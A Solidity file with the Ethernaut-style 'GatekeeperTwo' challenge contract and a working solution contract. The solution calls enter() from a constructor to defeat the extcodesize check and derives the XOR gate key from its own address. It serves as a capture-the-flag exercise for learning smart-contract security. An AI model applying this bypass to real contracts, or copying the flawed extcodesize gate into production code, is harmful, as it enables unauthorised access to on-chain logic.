// SPDX-License-Identifier: MIT
// 0xe95fe8490Ff07B62a6a812a5F04296b1db6e14F3
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoAttack {
    constructor(address _addr) {
        GatekeeperTwo two = GatekeeperTwo(_addr);
        //  uint64() ^ uint64(_gateKey) == type(uint64).max;
        // uint64(k) ^ uint64(_gateKey) == type(uint64).max;
        // a ^ b = c
        // a ^ a ^ b = c ^ a
        // 0 ^ b = c ^ a
        // 
        bytes8 k = bytes8(keccak256(abi.encodePacked(address(this))));
        uint64 gateKey = uint64(k) ^ type(uint64).max ;
        bytes8 _gateKey = bytes8(gateKey);
        require(two.enter(_gateKey), "fail");
    }
}